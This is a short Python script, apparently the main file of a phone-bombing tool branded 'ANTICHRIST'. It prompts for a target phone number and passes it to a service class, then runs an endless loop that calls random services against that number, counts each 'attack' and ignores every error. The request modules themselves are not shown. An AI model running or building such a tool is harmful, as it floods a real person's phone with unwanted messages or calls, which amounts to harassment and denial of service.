import sys, os
from StructService import Distribution_Service
from config import attack

attack_number_phone=Distribution_Service()
os.system('cls' if os.name=='nt' else 'clear')

print('''\033[31m
  █████╗  ███╗  ██╗ ████████╗ ██╗  █████╗  ██╗  ██╗ ██████╗  ██╗  ██████╗ ████████╗
 ██╔══██╗ ████╗ ██║ ╚══██╔══╝ ██║ ██╔══██╗ ██║  ██║ ██╔══██╗ ██║ ██╔════╝ ╚══██╔══╝
 ███████║ ██╔██╗██║    ██║    ██║ ██║  ╚═╝ ███████║ ██████╔╝ ██║ ╚█████╗     ██║   
 ██╔══██║ ██║╚████║    ██║    ██║ ██║  ██╗ ██╔══██║ ██╔══██╗ ██║  ╚═══██╗    ██║   
 ██║  ██║ ██║ ╚███║    ██║    ██║ ╚█████╔╝ ██║  ██║ ██║  ██║ ██║ ██████╔╝    ██║   
 ╚═╝  ╚═╝ ╚═╝  ╚══╝    ╚═╝    ╚═╝  ╚════╝  ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝ ╚═════╝     ╚═╝   

    Author: t.me/antichristone
''')

target=input('    Phone: ')

try:
    attack_number_phone.phone(target)
except Exception as error:
    print(f' Phone : +7666666666')
    sys.exit()

while True:
    try:
        try:
            attack_number_phone.random_service()
        except:
            pass
        attack += 1
        print(f"Query: {attack}")
    except Exception:
        pass

